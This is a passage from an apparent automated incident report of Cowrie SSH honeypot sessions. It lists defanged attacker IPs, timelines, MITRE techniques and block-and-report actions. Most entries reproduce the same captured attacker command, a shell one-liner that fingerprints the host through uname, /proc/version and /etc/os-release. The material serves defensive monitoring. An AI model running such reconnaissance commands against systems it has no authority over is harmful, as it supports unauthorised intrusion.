| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:02:16` | `cowrie.session.connect` |
| `2026-08-11 08:02:16` | `cowrie.client.version` |
| `2026-08-11 08:02:16` | `cowrie.client.kex` |
| `2026-08-11 08:02:18` | `cowrie.login.success` |
| `2026-08-11 08:02:19` | `cowrie.session.params` |
| `2026-08-11 08:02:19` | `cowrie.command.input` |
| `2026-08-11 08:02:19` | `cowrie.command.input` |
| `2026-08-11 08:02:19` | `cowrie.command.input` |
| `2026-08-11 08:02:19` | `cowrie.command.input` |
| `2026-08-11 08:02:19` | `cowrie.command.input` |
| `2026-08-11 08:02:19` | `cowrie.command.success` |
| `2026-08-11 08:02:19` | `cowrie.command.input` |
| `2026-08-11 08:02:19` | `cowrie.command.input` |
| `2026-08-11 08:02:19` | `cowrie.command.input` |
| `2026-08-11 08:02:19` | `cowrie.command.input` |
| `2026-08-11 08:02:20` | `cowrie.log.closed` |
| `2026-08-11 08:02:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b1c8c387ef8

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 08:04 |
| **Last Seen** | 2026-08-11 08:04 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:04:24` | `cowrie.session.connect` |
| `2026-08-11 08:04:24` | `cowrie.client.version` |
| `2026-08-11 08:04:24` | `cowrie.client.kex` |
| `2026-08-11 08:04:26` | `cowrie.login.success` |
| `2026-08-11 08:04:28` | `cowrie.session.params` |
| `2026-08-11 08:04:28` | `cowrie.command.input` |
| `2026-08-11 08:04:28` | `cowrie.command.input` |
| `2026-08-11 08:04:28` | `cowrie.command.input` |
| `2026-08-11 08:04:28` | `cowrie.command.input` |
| `2026-08-11 08:04:28` | `cowrie.command.input` |
| `2026-08-11 08:04:28` | `cowrie.command.success` |
| `2026-08-11 08:04:28` | `cowrie.command.input` |
| `2026-08-11 08:04:28` | `cowrie.command.input` |
| `2026-08-11 08:04:28` | `cowrie.command.input` |
| `2026-08-11 08:04:28` | `cowrie.command.input` |
| `2026-08-11 08:04:28` | `cowrie.log.closed` |
| `2026-08-11 08:04:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0eec00fe3872

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 08:06 |
| **Last Seen** | 2026-08-11 08:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:06:21` | `cowrie.session.connect` |
| `2026-08-11 08:06:21` | `cowrie.client.version` |
| `2026-08-11 08:06:21` | `cowrie.client.kex` |
| `2026-08-11 08:06:23` | `cowrie.login.success` |
| `2026-08-11 08:06:25` | `cowrie.session.params` |
| `2026-08-11 08:06:25` | `cowrie.command.input` |
| `2026-08-11 08:06:25` | `cowrie.command.input` |
| `2026-08-11 08:06:25` | `cowrie.command.input` |
| `2026-08-11 08:06:25` | `cowrie.command.input` |
| `2026-08-11 08:06:25` | `cowrie.command.input` |
| `2026-08-11 08:06:25` | `cowrie.command.success` |
| `2026-08-11 08:06:25` | `cowrie.command.input` |
| `2026-08-11 08:06:25` | `cowrie.command.input` |
| `2026-08-11 08:06:25` | `cowrie.command.input` |
| `2026-08-11 08:06:25` | `cowrie.command.input` |
| `2026-08-11 08:06:25` | `cowrie.log.closed` |
| `2026-08-11 08:06:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2963b781c98

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 08:08 |
| **Last Seen** | 2026-08-11 08:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:08:33` | `cowrie.session.connect` |
| `2026-08-11 08:08:33` | `cowrie.client.version` |
| `2026-08-11 08:08:33` | `cowrie.client.kex` |
| `2026-08-11 08:08:35` | `cowrie.login.success` |
| `2026-08-11 08:08:37` | `cowrie.session.params` |
| `2026-08-11 08:08:37` | `cowrie.command.input` |
| `2026-08-11 08:08:37` | `cowrie.command.input` |
| `2026-08-11 08:08:37` | `cowrie.command.input` |
| `2026-08-11 08:08:37` | `cowrie.command.input` |
| `2026-08-11 08:08:37` | `cowrie.command.input` |
| `2026-08-11 08:08:37` | `cowrie.command.success` |
| `2026-08-11 08:08:37` | `cowrie.command.input` |
| `2026-08-11 08:08:37` | `cowrie.command.input` |
| `2026-08-11 08:08:37` | `cowrie.command.input` |
| `2026-08-11 08:08:37` | `cowrie.command.input` |
| `2026-08-11 08:08:38` | `cowrie.log.closed` |
| `2026-08-11 08:08:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b971f72855c9

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-08-11 08:08 |
| **Last Seen** | 2026-08-11 08:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:08:54` | `cowrie.session.connect` |
| `2026-08-11 08:08:54` | `cowrie.client.version` |
| `2026-08-11 08:08:54` | `cowrie.client.kex` |
| `2026-08-11 08:08:55` | `cowrie.login.success` |
| `2026-08-11 08:08:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c4f723bc955

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-08-11 08:08 |
| **Last Seen** | 2026-08-11 08:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:08:54` | `cowrie.session.connect` |
| `2026-08-11 08:08:54` | `cowrie.client.version` |
| `2026-08-11 08:08:54` | `cowrie.client.kex` |
| `2026-08-11 08:08:55` | `cowrie.login.success` |
| `2026-08-11 08:08:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c674941ee315

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 08:10 |
| **Last Seen** | 2026-08-11 08:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:10:31` | `cowrie.session.connect` |
| `2026-08-11 08:10:31` | `cowrie.client.version` |
| `2026-08-11 08:10:31` | `cowrie.client.kex` |
| `2026-08-11 08:10:33` | `cowrie.login.success` |
| `2026-08-11 08:10:34` | `cowrie.session.params` |
| `2026-08-11 08:10:34` | `cowrie.command.input` |
| `2026-08-11 08:10:34` | `cowrie.command.input` |
| `2026-08-11 08:10:34` | `cowrie.command.input` |
| `2026-08-11 08:10:34` | `cowrie.command.input` |
| `2026-08-11 08:10:34` | `cowrie.command.input` |
| `2026-08-11 08:10:34` | `cowrie.command.success` |
| `2026-08-11 08:10:34` | `cowrie.command.input` |
| `2026-08-11 08:10:34` | `cowrie.command.input` |
| `2026-08-11 08:10:34` | `cowrie.command.input` |
| `2026-08-11 08:10:34` | `cowrie.command.input` |
| `2026-08-11 08:10:35` | `cowrie.log.closed` |
| `2026-08-11 08:10:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fabfaa914f95

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 08:13 |
| **Last Seen** | 2026-08-11 08:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:13:02` | `cowrie.session.connect` |
| `2026-08-11 08:13:03` | `cowrie.client.version` |
| `2026-08-11 08:13:03` | `cowrie.client.kex` |
| `2026-08-11 08:13:04` | `cowrie.login.success` |
| `2026-08-11 08:13:05` | `cowrie.session.params` |
| `2026-08-11 08:13:05` | `cowrie.command.input` |
| `2026-08-11 08:13:05` | `cowrie.command.input` |
| `2026-08-11 08:13:05` | `cowrie.command.input` |
| `2026-08-11 08:13:05` | `cowrie.command.input` |
| `2026-08-11 08:13:05` | `cowrie.command.input` |
| `2026-08-11 08:13:05` | `cowrie.command.success` |
| `2026-08-11 08:13:05` | `cowrie.command.input` |
| `2026-08-11 08:13:05` | `cowrie.command.input` |
| `2026-08-11 08:13:05` | `cowrie.command.input` |
| `2026-08-11 08:13:05` | `cowrie.command.input` |
| `2026-08-11 08:13:06` | `cowrie.log.closed` |
| `2026-08-11 08:13:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6782878f590

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 08:14 |
| **Last Seen** | 2026-08-11 08:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:14:59` | `cowrie.session.connect` |
| `2026-08-11 08:14:59` | `cowrie.client.version` |
| `2026-08-11 08:14:59` | `cowrie.client.kex` |
| `2026-08-11 08:15:01` | `cowrie.login.success` |
| `2026-08-11 08:15:02` | `cowrie.session.params` |
| `2026-08-11 08:15:02` | `cowrie.command.input` |
| `2026-08-11 08:15:02` | `cowrie.command.input` |
| `2026-08-11 08:15:02` | `cowrie.command.input` |
| `2026-08-11 08:15:02` | `cowrie.command.input` |
| `2026-08-11 08:15:02` | `cowrie.command.input` |
| `2026-08-11 08:15:02` | `cowrie.command.success` |
| `2026-08-11 08:15:02` | `cowrie.command.input` |
| `2026-08-11 08:15:02` | `cowrie.command.input` |
| `2026-08-11 08:15:02` | `cowrie.command.input` |
| `2026-08-11 08:15:02` | `cowrie.command.input` |
| `2026-08-11 08:15:02` | `cowrie.log.closed` |
| `2026-08-11 08:15:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-caaf4ed4d864

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 08:17 |
| **Last Seen** | 2026-08-11 08:17 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:17:02` | `cowrie.session.connect` |
| `2026-08-11 08:17:04` | `cowrie.client.version` |
| `2026-08-11 08:17:04` | `cowrie.client.kex` |
| `2026-08-11 08:17:12` | `cowrie.login.success` |
| `2026-08-11 08:17:15` | `cowrie.session.params` |
| `2026-08-11 08:17:15` | `cowrie.command.input` |
| `2026-08-11 08:17:15` | `cowrie.command.input` |
| `2026-08-11 08:17:15` | `cowrie.command.input` |
| `2026-08-11 08:17:15` | `cowrie.command.input` |
| `2026-08-11 08:17:15` | `cowrie.command.input` |
| `2026-08-11 08:17:15` | `cowrie.command.success` |
| `2026-08-11 08:17:15` | `cowrie.command.input` |
| `2026-08-11 08:17:15` | `cowrie.command.input` |
| `2026-08-11 08:17:15` | `cowrie.command.input` |
| `2026-08-11 08:17:15` | `cowrie.command.input` |
| `2026-08-11 08:17:16` | `cowrie.log.closed` |
| `2026-08-11 08:17:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4aeb6f911709

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-11 08:17 |
| **Last Seen** | 2026-08-11 08:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:17:28` | `cowrie.session.connect` |
| `2026-08-11 08:17:28` | `cowrie.client.version` |
| `2026-08-11 08:17:28` | `cowrie.client.kex` |
| `2026-08-11 08:17:28` | `cowrie.login.success` |
| `2026-08-11 08:17:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11b10620034d

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-11 08:17 |
| **Last Seen** | 2026-08-11 08:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:17:29` | `cowrie.session.connect` |
| `2026-08-11 08:17:29` | `cowrie.client.version` |
| `2026-08-11 08:17:29` | `cowrie.client.kex` |
| `2026-08-11 08:17:29` | `cowrie.login.success` |
| `2026-08-11 08:17:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33bd5fac13e7

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-11 08:17 |
| **Last Seen** | 2026-08-11 08:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:17:30` | `cowrie.session.connect` |
| `2026-08-11 08:17:30` | `cowrie.client.version` |
| `2026-08-11 08:17:30` | `cowrie.client.kex` |
| `2026-08-11 08:17:30` | `cowrie.login.success` |
| `2026-08-11 08:17:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8cb598ff6cd

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-11 08:17 |
| **Last Seen** | 2026-08-11 08:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:17:30` | `cowrie.session.connect` |
| `2026-08-11 08:17:30` | `cowrie.client.version` |
| `2026-08-11 08:17:30` | `cowrie.client.kex` |
| `2026-08-11 08:17:30` | `cowrie.login.success` |
| `2026-08-11 08:17:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e7a3ff62386

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 08:19 |
| **Last Seen** | 2026-08-11 08:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:19:13` | `cowrie.session.connect` |
| `2026-08-11 08:19:13` | `cowrie.client.version` |
| `2026-08-11 08:19:13` | `cowrie.client.kex` |
| `2026-08-11 08:19:14` | `cowrie.login.success` |
| `2026-08-11 08:19:15` | `cowrie.session.params` |
| `2026-08-11 08:19:16` | `cowrie.command.input` |
| `2026-08-11 08:19:16` | `cowrie.command.input` |
| `2026-08-11 08:19:16` | `cowrie.command.input` |
| `2026-08-11 08:19:16` | `cowrie.command.input` |
| `2026-08-11 08:19:16` | `cowrie.command.input` |
| `2026-08-11 08:19:16` | `cowrie.command.success` |
| `2026-08-11 08:19:16` | `cowrie.command.input` |
| `2026-08-11 08:19:16` | `cowrie.command.input` |
| `2026-08-11 08:19:16` | `cowrie.command.input` |
| `2026-08-11 08:19:16` | `cowrie.command.input` |
| `2026-08-11 08:19:16` | `cowrie.log.closed` |
| `2026-08-11 08:19:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-569f313dbcae

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 08:21 |
| **Last Seen** | 2026-08-11 08:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:21:20` | `cowrie.session.connect` |
| `2026-08-11 08:21:20` | `cowrie.client.version` |
| `2026-08-11 08:21:20` | `cowrie.client.kex` |
| `2026-08-11 08:21:21` | `cowrie.login.success` |
| `2026-08-11 08:21:22` | `cowrie.session.params` |
| `2026-08-11 08:21:22` | `cowrie.command.input` |
| `2026-08-11 08:21:22` | `cowrie.command.input` |
| `2026-08-11 08:21:22` | `cowrie.command.input` |
| `2026-08-11 08:21:22` | `cowrie.command.input` |
| `2026-08-11 08:21:22` | `cowrie.command.input` |
| `2026-08-11 08:21:22` | `cowrie.command.success` |
| `2026-08-11 08:21:22` | `cowrie.command.input` |
| `2026-08-11 08:21:22` | `cowrie.command.input` |
| `2026-08-11 08:21:22` | `cowrie.command.input` |
| `2026-08-11 08:21:22` | `cowrie.command.input` |
| `2026-08-11 08:21:22` | `cowrie.log.closed` |
| `2026-08-11 08:21:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-724eb88aad04

| Field | Detail |
|---|---|
| **Source IP** | `12.156.67[.]18` |
| **First Seen** | 2026-08-11 08:23 |
| **Last Seen** | 2026-08-11 08:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
